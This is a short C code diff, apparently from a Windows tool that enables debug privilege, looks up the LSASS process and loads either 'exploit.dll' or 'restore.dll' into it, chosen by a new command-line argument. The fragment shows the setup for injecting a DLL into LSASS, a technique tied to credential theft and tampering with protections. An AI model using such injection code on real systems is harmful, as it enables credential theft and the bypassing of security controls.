@@ -50,13 +50,18 @@ BOOL EnableDebugPrivilege() {
     return TRUE;
 }
 
-VOID main() {
+VOID main(int argc, char* argv[]) {
     DWORD PathResult, LsassPid;
     HANDLE ProcessHandle = NULL, ThreadHandle = NULL;
     LPVOID Allocation = NULL;
     CHAR FullPath[MAX_PATH];
     UINT64 FuncAddr;
     ULONG PreviousValue;
+    int op = 0;
+
+    if(argc >= 2) {
+        op = atoi(argv[1]);
+    }
 
     if (EnableDebugPrivilege()) {
         printf("Debug privileges enabled successfully.\n");
@@ -70,7 +75,8 @@ VOID main() {
         goto end;
     }
 
-    PathResult = GetFullPathNameA("exploit.dll", sizeof(FullPath), FullPath, NULL);
+    char* dll = (op == 0) ? "exploit.dll" : "restore.dll";
+    PathResult = GetFullPathNameA(dll, sizeof(FullPath), FullPath, NULL);
     if (!PathResult || (PathResult > sizeof(FullPath))) {
         goto end;
     }
